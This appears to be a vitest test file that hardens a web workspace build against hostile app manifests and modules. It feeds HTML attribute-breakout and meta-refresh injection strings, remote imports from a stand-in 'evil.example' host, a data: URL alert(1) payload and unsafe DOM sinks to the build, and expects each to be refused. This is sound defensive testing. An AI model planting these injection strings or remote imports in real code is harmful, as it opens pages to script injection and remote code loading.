// apps/workspace/test/first-party-hardening.test.mjs
//
// D#37 C24 / WS-F0, fix round 1 of PR #200 (security review MUST-1 and
// SHOULD-1..3, code review SHOULD-1). Companion to first-party-build.test.mjs:
// that file pins the happy path and the original C24 criteria; this one pins
// what a hostile or careless app author can still try. Each case builds a
// scratch apps tree through the real build() (or the real checks.mjs CLI) so a
// test cannot pass by testing a stub.

import { afterEach, describe, expect, it } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";

import { build } from "../build/build.mjs";
import { escapeAttr, loadFirstPartyApps, renderTags } from "../build/first-party.mjs";
import { injectFirstPartyTags } from "../build/profile.mjs";

const TEST_DIR = dirname(fileURLToPath(import.meta.url));
const WORKSPACE_DIR = join(TEST_DIR, "..");
const SHELL_DIR = join(WORKSPACE_DIR, "shell");
const CHECKS_MJS = join(WORKSPACE_DIR, "import", "checks.mjs");
const FIXTURE_APPS = join(TEST_DIR, "fixtures", "first-party", "apps");
const FIXTURE_PROFILE = join(TEST_DIR, "fixtures", "first-party", "profile.json");
const REAL_PROFILE = join(WORKSPACE_DIR, "profiles", "cloud.json");

const cleanupDirs = [];
afterEach(() => {
  while (cleanupDirs.length > 0) rmSync(cleanupDirs.pop(), { recursive: true, force: true });
});

function scratchDir(prefix) {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  cleanupDirs.push(dir);
  return dir;
}

function appsTree(files) {
  const dir = scratchDir("ws-f0-fix1-apps-");
  for (const [rel, content] of Object.entries(files)) {
    const dest = join(dir, rel);
    mkdirSync(dirname(dest), { recursive: true });
    writeFileSync(dest, content);
  }
  return dir;
}

const manifestOf = (over, id = "demo") => JSON.stringify({ id, entry: "main.js", ...over });

// The real cloud profile plus the given first-party ids, in the given order.
function profileWith(...ids) {
  const p = JSON.parse(readFileSync(REAL_PROFILE, "utf8"));
  p.app_modules.push(...ids);
  const path = join(scratchDir("ws-f0-fix1-prof-"), "profile.json");
  writeFileSync(path, JSON.stringify(p));
  return path;
}

function buildDemo(mainSource, extraFiles = {}) {
  const appsDir = appsTree({ "demo/manifest.json": manifestOf({}), "demo/main.js": mainSource, ...extraFiles });
  return build({ profilePath: profileWith("demo"), appsDir, outDir: scratchDir("ws-f0-fix1-out-") });
}

function buildError(fn) {
  try {
    fn();
  } catch (e) {
    return String(e.message);
  }
  return "";
}

// A minimal dist/ for driving checks.mjs --ship directly.
function distWith(files) {
  const dist = scratchDir("ws-f0-fix1-dist-");
  for (const [rel, content] of Object.entries(files)) {
    mkdirSync(dirname(join(dist, rel)), { recursive: true });
    writeFileSync(join(dist, rel), content);
  }
  return dist;
}

function runChecks(dist, extra = []) {
  try {
    const out = execFileSync(process.execPath, [CHECKS_MJS, "--ship", dist, ...extra], { stdio: "pipe" });
    return { code: 0, out: String(out) };
  } catch (e) {
    return { code: e.status, out: String(e.stdout) + String(e.stderr) };
  }
}

// ── MUST-1: HTML injection through manifest paths ───────────────────────────

// Hostile names are REAL files, so the only thing that can refuse them is the
// manifest validator (against 1adeea7 each one built clean).
const HOSTILE_NAMES = [
  ['a double quote', 'x"y'],
  ["a less-than", "x<y"],
  ["a greater-than", "x>y"],
  ["a space", "x y"],
  ["a tab", "x\ty"],
  ["a single quote", "x'y"],
  ["an equals sign", "x=y"],
  ["an ampersand", "x&y"],
  ["a backtick", "x`y"],
  ["a semicolon", "x;y"],
  ["a parenthesis", "x(y)"],
  ["a non-ASCII letter", "xéy"],
  ["an attribute breakout", 'x" data-core="1'],
  ["a meta-refresh breakout", 's"><meta http-equiv="refresh" content="0;url=.."><link x="'],
];

describe("MUST-1 (CWE-79/116): manifest paths use a strict charset", () => {
  it.each(HOSTILE_NAMES)("refuses an entry with %s in its name", (_label, stem) => {
    const file = `${stem}.js`;
    const dir = appsTree({ "demo/manifest.json": manifestOf({ entry: file }), [`demo/${file}`]: "export {};\n" });
    expect(() => loadFirstPartyApps(dir, { shellDir: SHELL_DIR })).toThrow(/entry.*(?:allowed charset|plain relative path)/);
  });

  it.each(HOSTILE_NAMES)("refuses a style with %s in its name", (_label, stem) => {
    const file = `${stem}.css`;
    const dir = appsTree({
      "demo/manifest.json": manifestOf({ styles: [file] }),
      "demo/main.js": "export {};\n",
      [`demo/${file}`]: "a{}\n",
    });
    expect(() => loadFirstPartyApps(dir, { shellDir: SHELL_DIR })).toThrow(/styles.*(?:allowed charset|plain relative path)/);
  });

  it("checks every segment, not just the file name", () => {
    const dir = appsTree({
      "demo/manifest.json": manifestOf({ entry: 'su"b/main.js' }),
      'demo/su"b/main.js': "export {};\n",
    });
    expect(() => loadFirstPartyApps(dir, { shellDir: SHELL_DIR })).toThrow(/allowed charset/);
  });

  it("refuses a segment that starts with a dot", () => {
    const hidden = appsTree({ "demo/manifest.json": manifestOf({ entry: ".main.js" }), "demo/.main.js": "" });
    expect(() => loadFirstPartyApps(hidden, { shellDir: SHELL_DIR })).toThrow();
    const dotDot = appsTree({ "demo/manifest.json": manifestOf({ entry: "sub/..js" }), "demo/sub/..js": "" });
    expect(() => loadFirstPartyApps(dotDot, { shellDir: SHELL_DIR })).toThrow();
  });

  it("still accepts letters, digits, dot, underscore and hyphen in nested paths", () => {
    const dir = appsTree({
      "demo/manifest.json": manifestOf({ entry: "src/Main_v2.app-x.js", styles: ["css/a-1.b_2.css"] }),
      "demo/src/Main_v2.app-x.js": "export {};\n",
      "demo/css/a-1.b_2.css": "a{}\n",
    });
    const model = loadFirstPartyApps(dir, { shellDir: SHELL_DIR });
    expect(model.apps[0].entry).toBe("src/Main_v2.app-x.js");
  });

  it("the meta-refresh payload never reaches a built index.html (build refuses)", () => {
    const evil = 's"><meta http-equiv="refresh" content="0;url=.."><link x=".css';
    const appsDir = appsTree({
      "demo/manifest.json": manifestOf({ styles: [evil] }),
      "demo/main.js": "export {};\n",
      [`demo/${evil}`]: "a{}\n",
    });
    const outDir = scratchDir("ws-f0-fix1-out-");
    expect(() => build({ profilePath: profileWith("demo"), appsDir, outDir })).toThrow(/allowed charset/);
  });

  it("the built dist index.html holds exactly the expected first-party tags and no extra elements", () => {
    const outDir = scratchDir("ws-f0-fix1-out-");
    build({ profilePath: FIXTURE_PROFILE, appsDir: FIXTURE_APPS, outDir });
    const html = readFileSync(join(outDir, "index.html"), "utf8");
    const fpLines = html.split("\n").filter((l) => l.includes("fp-fixture") && !l.includes("modulepreload"));
    expect(fpLines).toEqual([
      '    <script type="module" src="apps/fp-fixture/main.js" data-app="fp-fixture"></script>',
      '    <link rel="stylesheet" href="apps/fp-fixture/fixture.css" data-app="fp-fixture">',
    ]);
    // Nothing else changed shape: same element counts as the imported index.html.
    const shellHtml = readFileSync(join(SHELL_DIR, "index.html"), "utf8");
    const count = (text, re) => (text.match(re) ?? []).length;
    expect(count(html, /<meta\b/g)).toBe(count(shellHtml, /<meta\b/g));
    expect(count(html, /<base\b/g)).toBe(1);
    expect(html).not.toMatch(/http-equiv="refresh"/i);
  });
});

describe("MUST-1: renderTags escapes attribute values (second layer)", () => {
  it("escapeAttr neutralises every attribute-breaking character", () => {
    const out = escapeAttr(`a"b'c<d>e&f\`g h\ti\nj`);
    expect(out).not.toMatch(/["'<>`\s]/);
    expect(out).toContain("&amp;");
    expect(out).toContain("&quot;");
  });

  it("renderTags output stays one well-formed tag per line even for a model the loader never validated", () => {
    const model = {
      apps: [{ id: 'x" data-core="1', entry: 'e"><meta http-equiv="refresh">.js', styles: ['s"><link x=".css'] }],
    };
    const lines = renderTags(model, { app_modules: ['x" data-core="1'] });
    expect(lines).toHaveLength(2);
    for (const line of lines) {
      expect(line).toMatch(/^ {4}<(?:script|link) [^<>]*>(?:<\/script>)?$/);
      // Exactly the attributes we wrote, none smuggled in.
      const attrNames = [...line.matchAll(/ ([a-z-]+)="/g)].map((m) => m[1]);
      expect(attrNames.filter((n) => n === "data-core" || n === "http-equiv" || n === "x")).toEqual([]);
    }
  });
});

// ── SHOULD-1: dropped modules / unlisted apps ───────────────────────────────

describe("SHOULD-1 (A05): a first-party import may not re-ship what the profile removed", () => {
  it("refuses an import of a drop_core module (core/crdt-sync-client.js)", () => {
    const msg = buildError(() => buildDemo('import "../../core/crdt-sync-client.js";\n'));
    expect(msg).toMatch(/does not ship/);
    expect(msg).toMatch(/core\/crdt-sync-client\.js/);
    expect(msg).toMatch(/drop_core/);
  });

  it("refuses an import of an imported app app_modules does not list (apps/agents, apps/kanban)", () => {
    for (const target of ["agents/agents-stream.js", "kanban/kanban-board.js"]) {
      const msg = buildError(() => buildDemo(`import "../${target}";\n`));
      expect(msg, target).toMatch(/does not ship/);
      expect(msg, target).toMatch(/app_modules/);
    }
  });

  it("refuses an import of another first-party app the profile does not list", () => {
    const msg = buildError(() =>
      buildDemo('import "../other/x.js";\n', {
        "other/manifest.json": manifestOf({ entry: "x.js" }, "other"),
        "other/x.js": "export {};\n",
      })
    );
    expect(msg).toMatch(/does not ship/);
    expect(msg).toMatch(/app "other"/);
  });

  it("names the importing file in the failure", () => {
    expect(buildError(() => buildDemo('import "../../core/crdt-sync-client.js";\n'))).toMatch(/apps\/demo\/main\.js ->/);
  });

  it("still allows a shared _lib and a listed app's own files", () => {
    const result = buildDemo('import { a } from "../_lib/a.js";\nimport "./b.js";\nexport { a };\n', {
      "_lib/a.js": "export const a = 1;\n",
      "demo/b.js": "export {};\n",
    });
    expect(result.copiedFiles).toEqual(expect.arrayContaining(["apps/_lib/a.js", "apps/demo/b.js"]));
  });

  it("does not affect an imported file's own imports (only edges from first-party files)", () => {
    const result = buildDemo('import "../../sdk/fulc-sdk.js";\n');
    expect(result.copiedFiles).toContain("sdk/fulc-sdk.js");
  });
});

// ── SHOULD-2: sinks and non-relative specifiers ─────────────────────────────

describe("SHOULD-2 (A03/A08): first-party output gets the sink and remote-import checks", () => {
  it.each([
    ["innerHTML", "document.body.innerHTML = x;"],
    ["outerHTML", "el.outerHTML = x;"],
    ["insertAdjacentHTML", 'el.insertAdjacentHTML("beforeend", x);'],
    ["eval", 'eval("1");'],
    ["new Function", 'new Function("return 1")();'],
    ["document.write", "document.write(x);"],
    ["a sink hidden behind a string that contains //", 'const a = "//"; el.innerHTML = x;'],
  ])("--ship fails a first-party file that uses %s", (_label, code) => {
    const msg = buildError(() => buildDemo(`${code}\n`));
    expect(msg).toMatch(/checks\.mjs --ship failed/);
    expect(msg).toMatch(/first-party-trusted-types-sink: apps\/demo\/main\.js/);
  });

  it("--ship fails a sink that only appears after TS compilation", () => {
    const appsDir = appsTree({
      "demo/manifest.json": manifestOf({ entry: "main.ts" }),
      "demo/main.ts": "const el = document.body;\nel.innerHTML = 'x';\nexport {};\n",
    });
    const msg = buildError(() =>
      build({ profilePath: profileWith("demo"), appsDir, outDir: scratchDir("ws-f0-fix1-out-") })
    );
    expect(msg).toMatch(/first-party-trusted-types-sink: apps\/demo\/main\.js/);
  });

  it.each([
    ["a static http(s) URL import", 'import "https://evil.example/x.js";'],
    ["a static URL import with a binding", 'import { a } from "http://evil.example/x.js";'],
    ["a dynamic URL import", 'import("https://evil.example/x.js");'],
    ["a protocol-relative import", 'import "//evil.example/x.js";'],
    ["a bare package specifier", 'import x from "lodash";'],
    ["a root-absolute specifier", 'import "/core/boot.js";'],
    ["a data: URL import", 'import "data:text/javascript,alert(1)";'],
  ])("the build refuses %s instead of dropping it", (_label, code) => {
    const msg = buildError(() => buildDemo(`${code}\n`));
    expect(msg).toMatch(/non-relative specifier/);
    expect(msg).toMatch(/apps\/demo\/main\.js/);
  });

  it("checks.mjs --ship also catches the remote-import and sink forms in raw first-party output", () => {
    const dist = distWith({
      "apps/demo/url.js": 'import("https://evil.example/x.js");\n',
      "apps/demo/static.js": 'import "//evil.example/x.js";\n',
      "apps/demo/sink.js": "document.body.insertAdjacentHTML('beforeend', x);\n",
      "apps/demo/clean.js": "export const a = 1;\n",
    });
    const { code, out } = runChecks(dist, ["--first-party-prefix", "apps/demo/"]);
    expect(code).not.toBe(0);
    expect(out).toMatch(/first-party-remote-import: apps\/demo\/url\.js/);
    expect(out).toMatch(/first-party-remote-import: apps\/demo\/static\.js/);
    expect(out).toMatch(/first-party-trusted-types-sink: apps\/demo\/sink\.js/);
    expect(out).not.toMatch(/clean\.js/);
  });

  it("a clean first-party file passes --ship with its prefix", () => {
    const dist = distWith({ "apps/demo/clean.js": "export const a = 1;\n" });
    expect(runChecks(dist, ["--first-party-prefix", "apps/demo/"]).code).toBe(0);
  });
});

// ── SHOULD-3: --first-party-prefix ──────────────────────────────────────────

describe("SHOULD-3: --first-party-prefix refuses directories the imported tree owns", () => {
  it("a planted apps/kanban/zz-evil.js is not admitted by --first-party-prefix apps/kanban/", () => {
    const dist = distWith({ "apps/kanban/zz-evil.js": "export {};\n" });
    const without = runChecks(dist);
    expect(without.out).toMatch(/not-allowlisted: apps\/kanban\/zz-evil\.js/);
    const withPrefix = runChecks(dist, ["--first-party-prefix", "apps/kanban/"]);
    expect(withPrefix.code).not.toBe(0);
    expect(withPrefix.out).toMatch(/imported tree owns that directory/);
  });

  it.each(["apps/kanban/", "apps/agents/", "apps/themes/", "apps/activation/", "apps/kanban/,apps/demo/"])(
    "refuses the imported-app prefix list %s",
    (prefix) => {
      const dist = distWith({ "apps/demo/main.js": "export {};\n" });
      const r = runChecks(dist, ["--first-party-prefix", prefix]);
      expect(r.code).not.toBe(0);
      expect(r.out).toMatch(/refusing --first-party-prefix/);
    }
  );

  it.each(["", "apps/", "core/", "sdk/", "../apps/demo/", "apps/demo", "/apps/demo/", "apps/a/b/"])(
    "refuses the out-of-root or malformed prefix %j",
    (prefix) => {
      const dist = distWith({ "apps/demo/main.js": "export {};\n" });
      const r = runChecks(dist, ["--first-party-prefix", prefix]);
      expect(r.code).not.toBe(0);
    }
  );

  it("still accepts a genuine first-party prefix", () => {
    const dist = distWith({ "apps/demo/main.js": "export {};\n", "apps/_lib/a.js": "export {};\n" });
    expect(runChecks(dist, ["--first-party-prefix", "apps/demo/,apps/_lib/"]).code).toBe(0);
  });
});

// ── code review SHOULD-1: ordering and injectFirstPartyTags ─────────────────

describe("tag order and injectFirstPartyTags", () => {
  const twoApps = () =>
    appsTree({
      "zeta/manifest.json": manifestOf({ entry: "z.js", styles: ["z1.css", "z2.css"] }, "zeta"),
      "zeta/z.js": "export {};\n",
      "zeta/z1.css": "a{}\n",
      "zeta/z2.css": "b{}\n",
      "alpha/manifest.json": manifestOf({ entry: "a.js", styles: ["a1.css"] }, "alpha"),
      "alpha/a.js": "export {};\n",
      "alpha/a1.css": "a{}\n",
    });

  const expectedOrder = [
    '<script type="module" src="apps/alpha/a.js" data-app="alpha"></script>',
    '<link rel="stylesheet" href="apps/alpha/a1.css" data-app="alpha">',
    '<script type="module" src="apps/zeta/z.js" data-app="zeta"></script>',
    '<link rel="stylesheet" href="apps/zeta/z1.css" data-app="zeta">',
    '<link rel="stylesheet" href="apps/zeta/z2.css" data-app="zeta">',
  ];

  it("renderTags orders apps by id, then script, then styles in manifest order, whatever app_modules order says", () => {
    const model = loadFirstPartyApps(twoApps(), { shellDir: SHELL_DIR });
    const lines = renderTags(model, { app_modules: ["zeta", "alpha"] }).map((l) => l.trim());
    expect(lines).toEqual(expectedOrder);
    expect(renderTags(model, { app_modules: ["alpha", "zeta"] }).map((l) => l.trim())).toEqual(expectedOrder);
  });

  it("a build with two apps lists them in that fixed order, directly after the last data-core tag", () => {
    const result = build({
      profilePath: profileWith("zeta", "alpha"),
      appsDir: twoApps(),
      outDir: scratchDir("ws-f0-fix1-out-"),
    });
    const lines = readFileSync(join(result.outDir, "index.html"), "utf8")
      .split("\n")
      .map((l) => l.trim());
    const first = lines.indexOf(expectedOrder[0]);
    expect(first).toBeGreaterThan(0);
    expect(lines.slice(first, first + expectedOrder.length)).toEqual(expectedOrder);
    const lastCore = lines.reduce((acc, l, i) => (/\bdata-core\b/.test(l) && /^<(?:script|link)/.test(l) ? i : acc), -1);
    expect(first).toBe(lastCore + 1);
  });

  it("injectFirstPartyTags splices the lines in right after the LAST data-core tag and touches nothing else", () => {
    const html = [
      "<head>",
      '  <script src="a.js" data-core></script>',
      '  <script src="b.js" data-core></script>',
      '  <script src="c.js" data-app="x"></script>',
      "</head>",
    ].join("\n");
    const out = injectFirstPartyTags(html, ["  <first>", "  <second>"]).split("\n");
    expect(out).toEqual([
      "<head>",
      '  <script src="a.js" data-core></script>',
      '  <script src="b.js" data-core></script>',
      "  <first>",
      "  <second>",
      '  <script src="c.js" data-app="x"></script>',
      "</head>",
    ]);
  });

  it("injectFirstPartyTags with no lines returns the html untouched, and throws when there is no data-core tag", () => {
    const html = "<head>\n  <script src=\"a.js\" data-core></script>\n</head>";
    expect(injectFirstPartyTags(html, [])).toBe(html);
    expect(() => injectFirstPartyTags("<head>\n</head>", ["  <x>"])).toThrow(/data-core/);
    // Even with no lines to add, a page with no data-core tag is not an error.
    expect(injectFirstPartyTags("<head>\n</head>", [])).toBe("<head>\n</head>");
  });
});
